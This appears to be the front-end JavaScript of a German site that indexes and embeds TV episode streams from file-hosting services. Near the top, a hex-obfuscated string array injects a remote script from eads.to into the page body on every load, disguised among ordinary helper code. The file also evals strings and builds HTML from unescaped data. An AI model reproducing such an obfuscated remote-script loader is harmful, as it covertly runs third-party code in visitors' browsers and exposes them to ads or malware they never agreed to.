/*OnChange*/if(!Array.prototype.indexOf){Array.prototype.indexOf=function(elt){var len=this.length;var from=Number(arguments[1])||0;from=(from<0)?Math.ceil(from):Math.floor(from);if(from<0)from+=len;for(;from<len;from++){if(from in this&&this[from]===elt)return from}return-1}}var onChange={terms:[],actions:[],values:[],set:function(term,action){index=onChange.terms.indexOf(term);if(index==-1){this.terms.push(term);this.actions.push(action);this.values.push(eval(term))}else{this.terms[index]=term;this.actions[index]=action;this.values[index]=eval(term)}console.log(this.terms.length);if(this.terms.length==1){this.checkInterval=setInterval(function(){onChange.check()},10)}},check:function(){for(i in this.terms){if(eval("eval(this.terms[i])")!=this.values[i]){this.actions[i](newval=eval(this.terms[i]),oldval=this.values[i]);this.values[i]=eval(this.terms[i])}}},unset:function(term){index=this.terms.indexOf(term);this.terms.splice(index,1);this.actions.splice(index,1);this.values.splice(index,1);if(this.terms.length==0){clearInterval(this.checkInterval)}}};var _0xd883=["\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x65\x61\x64\x73\x2E\x74\x6F\x2F\x6C\x61\x79\x65\x72\x2E\x70\x68\x70\x3F\x69\x64\x3D\x31\x31\x33\x37\x37\x26\x70\x64\x3D\x31","\x61\x74\x74\x72","\x73\x63\x72\x69\x70\x74\x5B\x73\x72\x63\x2A\x3D\x22\x2F\x65\x61\x64\x73\x2E\x74\x6F\x22\x5D","\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x3A\x2F\x2F\x65\x61\x64\x73\x2E\x74\x6F\x2F\x6C\x61\x79\x65\x72\x2E\x70\x68\x70\x3F\x69\x64\x3D\x31\x31\x33\x37\x37\x26\x70\x64\x3D\x31\x27\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x61\x70\x70\x65\x6E\x64","\x62\x6F\x64\x79"];$(_0xd883[3])[_0xd883[2]](_0xd883[0],_0xd883[1]);$(_0xd883[6])[_0xd883[5]](_0xd883[4]);
/*str*/str = function(string, rep) {$.each(rep, function(i,v) {string = string.split("$"+ (i+1) ).join(v);});return string;};
/*colify*/function colify(k,m){var b=k.style;b.MozColumnCount=m;b.WebkitColumnCount=m;if(typeof b.MozColumnCount=="string"||typeof b.WebkitColumnCount=="string"){return}var e=k.previousSibling;if(typeof e!="undefined"&&typeof e.tagName!="undefined"&&e.tagName.toLowerCase()=="table"){e.parentNode.removeChild(e)}if(m==1){b.display="block";return}var c=k.getElementsByTagName("li");var d=c.length;var n=[];for(var h=0;h<d;h++){if(c[h].style.display!="none"){n.push(c[h])}}var o=n.length;var a=Math.ceil(o/m);var p=document.createElement("table");p.style.width="100%";for(h=0;h<a;h++){var l=p.insertRow(h);for(var g=0;g<m;g++){var f=n[h*m+g];if(typeof f!="undefined"){l.insertCell(g).appendChild(f.firstChild.cloneNode(true))}}l.style.backgroundColor="white"}k.parentNode.insertBefore(p,k);b.display="none"}


onChange.set("document.location.hash", function () {
    extract_hash(newval);
});

function extract_hash(hash) {
    hash = hash.substr(2);
    hash = hash.replace(/\/$/, "");
    hash = hash.split("/");
    hash.shift();
    if (typeof hash[0] == "undefined") load("index");
    else if (hash.length == 2) load("serie", hash[1], 1);
    else if (hash.length == 3) load("serie", hash[1], hash[2]);
    else if (hash.length == 4) load("serie", hash[1], hash[2], hash[3]);
    else if (hash.length == 5) load("serie", hash[1], hash[2], hash[3], hash[4]);
    return true;
}

function load(page, series, season, epi, host) {
    if (page == "index") {
        $("#page").html('<h2>Alle Serien</h2><form id="serForm" onsubmit="search(); return false;" style="display: block;"><input type="text" placeholder="Serien durchsuchen" onkeyup="search();" id="sfield"></form>');
        pageTitle("Alle Serien");
        url = "serie/series.json";
        success = function (data) {
            $("#page").removeClass().addClass("andere-serien");
            $("#page").append("<ul id='series'></ul>");
            allSeries = [];
            $.each(data, function (link, serie) {
                $("#series").append(str("<li><a href='#!/serie/$1'>$2</a></li>", [link, serie]));
                allSeries[allSeries.length] = {l:link, s:serie};
            });
            colify(document.getElementById('series'), 3);

        }
        $.ajax({
            url:url,
            success:function (data) {
                success(data)
            },
            error: function () {
                error("Request error.");
            },
            type:"get",
            dataType:"json"
        });
    }

    if (page == "serie") {
        if (typeof epi == "undefined") {
            $.ajax({
                url:str("serie/$1/$2/info.json", [series, season]),
                success:function (data) {
                    console.log(".");
                    pageTitle(str('$1 ($2)', [data.series, season]));
                    $("#page").removeClass().addClass("serie");
                    $("#page").html("");
                    $("#page").html(str('<h2>$1 <small>$2</small></h2>' +
                        '<div class="cover-image"><img src="asset/covers/$3" alt="$1" title="$1"/></div>' +
                        '<div class="staffeln"><strong>Staffeln:</strong><ul class="pages" id="seasons"></ul></div><br/>', [data.series, (season == 0) ? 'Filme' : 'Staffel ' + season, data.cover]));
                    data.seasons++;
                    while (--data.seasons) {
                        $("#seasons").prepend(str('<li$1><a href="#!/serie/$3/$2">$2</a></li>', [(data.seasons == season) ? ' class="current"' : '', data.seasons, series]));
                    }
                    console.log("..");
                    if (data.movies) {
                        $("#seasons").prepend(str('<li class="button$1"><a href="#!/serie/$3/$2">Filme</a></li>', [(0 == season) ? ' current' : '', 0, series]));
                    }
                    $("#page").append('<table id="episodes"><tr><th title="Episode in Serie">#</th><th>Name</th><th>Videos</th></tr>');
                    $.each(data.episodes, function (i, row) {
                        $("#episodes").append(str('<tr>' +
                            '<td> $1</td>' +
                            '<td><a href="#!/serie/$2/$3/$1"><strong>$4</strong> <span lang="en">$5</span></a></td>' +
                            '<td class="nowrap" id="hosts$1"></td>' +
                            '</tr>', [i + 1, series, season, row.german, row.english]));

                        hosts_td = "#hosts" + (i + 1);
                        $.each(row.hoster, function (useless, host) {
                            $(hosts_td).append(str(' <a href="#!/serie/$1/$2/$3/$4-1" class="icon $4" title="$4">$4</a>', [series, season, i + 1, host]));
                        })
                    })
                },
                error: function () {
                    error("Request error.");
                },
                type:"get",
                dataType:"json"
            });
        } else if (typeof host == "undefined") {
            show_epi(series, season, epi);
        } else {
            host = host.split("-");
            show_epi(series, season, epi, {h:host[0], p:host[1]});
        }
    }


}


function make_embed(link, hoster) {
    switch (hoster) {

        case "YouTube":
            link = link.replace("=", "");
            return {
                e:str('<iframe width="640" height="390" src="https://www.youtube-nocookie.com/embed/$1?rel=0" frameborder="0" allowfullscreen></iframe>', [link]),
                l:str('http://www.youtube.com/watch?v=$1', [link])
            };
            break;

        case "PutLocker":
            return {
                e:str('<iframe src="http://www.putlocker.com/embed/$1" width="640" height="390" frameborder="0"></iframe>', [link]),
                l:str('http://www.putlocker.com/file/$1', [link])
            };
            break;

        case "RapidVideo":
            return {
                e:str('<a target="_blank" href="http://www.rapidvideo.com/view/$1"><img src="asset/img/bsplayer.png"></a>', [link]),
                l:str('http://rapidvideo.com/view/$1', [link])
            };
            break;

        case "DivxStage":
            return {
                e:str('<iframe scrolling="no" src="http://embed.divxstage.eu/embed.php?v=$1&amp;width=600&amp;height=400" style="overflow: hidden; border: 0; width: 600px; height: 400px"></iframe>', [link]),
                l:str('http://www.divxstage.eu/video/$1', [link])
            };

            break;

        case "Sockshare":
            return {
                e:str('<iframe src="http://www.sockshare.com/embed/$1" width="640" height="390" frameborder="0"></iframe>', [link]),
                l:str('http://www.sockshare.com/file/$1', [link])
            };
            break;

        case "Ecostream":
            return {
                e:str('<a target="_blank" href="http://www.ecostream.tv/stream/$1"><img src="asset/img/bsplayer.png" /></a>', [link]),
                l:str('http://www.ecostream.tv/stream/$1', [link])
            };
            break;

        case "BitShare":
            return {
                e:str('<a target="_blank" href="http://www.bitshare.com/files/$1"><img src="asset/img/bsplayer.png"></a>', [link]),
                l:str('http://www.bitshare.com/files/$1', [link])
            };
            break;

        case "VideoWeed":
            return {
                e:str('<a target="_blank" href="http://www.videoweed.es/file/$1"><img src="asset/img/bsplayer.png"></a>', [link]),
                l:str('http://www.videoweed.es/files/$1', [link])
            };
            break;

        case "UploadC":
            return {
                e:str('<a target="_blank" href="http://www.uploadc.com/$1"><img src="asset/img/bsplayer.png"></a>', [link]),
                l:str('http://www.uploadc.com/$1', [link])
            };
            break;

        case "MySpass":
            return {
                e:str('<a target="_blank" href="http://myspass.de/$1"><img src="asset/img/bsplayer.png"></a>', [link]),
                l:str('http://myspass.de/$1', [link])
            }

        case "MyVideo":
            link = link.split("/");
            return {
                e:str("<iframe src='https://www.myvideo.de/embed/$1' style='width:640px;height:390px;border:0px none;padding:0;margin:0;' width='640' height='390'  scrolling='no'></iframe>", [link[0]]),
                l:str('http://www.myvideo.de/watch/$1/$2', [link[0], link[1]])
            }
    }

}

function show_epi(series, season, epi, host) {
    $("#page").html("");
    $.ajax({
        url:"serie/" + series + "/" + season + "/info.json",
        type:"get",
        dataType:"json",
        success:function (data) {
            $("#page").removeClass().addClass("serie");
            $("#page").html(str('<h2>$1 <small>Staffel $2</small></h2>' +
                '<div class="cover-image"><img src="asset/covers/$3" alt="$1" title="$1"/></div>' +
                '<div class="staffeln"><strong>Staffeln:</strong><ul class="pages" id="seasons"></ul></div><br />' +
                '<strong>Episoden:</strong><ul class="pages" id="episodes"></ul>', [data.series, season, data.cover]));
            data.seasons++;
            while (--data.seasons) {
                $("#seasons").prepend(str('<li$1><a href="#!/serie/$3/$2">$2</a></li>', [(data.seasons == season) ? ' class="current"' : '', data.seasons, series]));
            }
            if (data.movies) {
                $("#seasons").prepend(str('<li class="button$1"><a href="#!/serie/$3/$2">Filme</a></li>', [(0 == season) ? ' current' : '', 0, series]));
            }
            epis = data.episodes.length + 1;
            while (--epis) {
                $("#episodes").prepend(str('<li$6>' +
                    '<a href="#!/serie/$1/$2/$7">$7</a>' +
                    '<div class="epiInfo"><div style="border-bottom: 1px solid black;">' +
                    '<strong>$4 <small lang="en">$5</small></strong>' +
                    '</div><strong id="videos$3">Videos:</strong><br /></div></li>',

                    [series, season, epis - 1, data.episodes[epis - 1].german, data.episodes[epis - 1].english, (epis == epi) ? ' class="current"' : '', epis]));
                $.each(data.episodes[epis - 1].hoster, function (n, host) {
                    $("#videos" + (epis - 1)).append(str(' <a href="#!/serie/$1/$2/$3/$4-1" class="v-centered icon $4">$4</a>',
                        [series, season, epi, host]
                    ));
                })
            }
            $.ajax({
                url:"serie/" + series + "/" + season + "/" + epi + ".json",
                dataType:"json",
                type:"get",
                success:function (e) {
                    pageTitle(str('$1: $2 - $3 ($4)', [epi, e.titlede, data.series, season]));
                    $("#page").append(str(
                        '<h2>' +
                            '$1' +
                            '<small id="titleEnglish" lang="en">$2</small>' +
                            '</h2>' +
                            '<p id="description">$3</p>' +
                            '<h3 style="clear: both;">Hoster dieser Episode:</h3>' +
                            '<ul id="hoster_episode"></ul>',
                        [e.titlede, e.titleen, e.description]
                    ));
                    links = e.links.length + 1;
                    hosts = {};
                    multipart = {h:"", p:1};
                    while (--links) {
                        link = e.links[(links - 1)];

                        multipart_b = false;
                        if (typeof host != "undefined" && link.hoster == host.h) {
                            if (link.part == host.p) {
                                emb = make_embed(link.link, link.hoster);
                                console.log(emb);
                                $("#description").after(str('$1<div id="video_actions"><div><a href="$2"><span class="icon link_go"></span> Link zum Originalvideo</a></div></div><br />', [emb.e, emb.l]));
                            }
                            if (multipart.p < link.part) {
                                multipart.p = link.part;
                                multipart.h = link.hoster;
                            }
                        }


                        $("#hoster_episode").prepend(str(
                            '<li><a href="#!/serie/$1/$2/$3/$4-$5"><span class="icon $4"></span> $4 - Teil $5</a></li>',
                            [series, season, epi, link.hoster, link.part]
                        ));
                    }
                    if (multipart.p > host.p && multipart.h == host.h) {
                        $("#video_actions").append(str('<a href="#!/serie/$1/$2/$3/$4-$5" title="Nächster Teil" rel="next"><img src="asset/img/arrowrightlarge.png" alt="Nächster Teil"/></a>', [series, season, epi, host.h, parseInt(host.p) + 1]));
                    }

                    if (parseInt(host.p) >= 2) {
                        $("#video_actions").prepend(str('<a rel="prev" title="Vorheriger Teil" href="#!/serie/$1/$2/$3/$4-$5"><img alt="Vorheriger Teil" src="asset/img/arrowleftlarge.png"></a>', [series, season, epi, host.h, parseInt(host.p) - 1]));
                    }
                },
                error: function() {
                    error("Request error.");
                }
            })
        },
        error: function () {
            error("Request error.");
        }
    });

}

function search() {
    term = $("#sfield").val();
    $("#series").html("");
    $.each(allSeries, function (i, v) {
        if (v.s.toLowerCase().indexOf(term.toLowerCase()) != -1) {
            $("#series").append(str('<li><a href="#!/series/$1">$2</a></li>', [v.l, v.s]));
        }
    });
    colify(document.getElementById('series'), 3);
}

function pageTitle(title) {
    $("title").html(title + " - Kostenlose Video Streams");
}

function error(text) {
    $("#page").html(str("<div class='messageBox error'>$1</span>", [text]));
}

extract_hash(document.location.hash);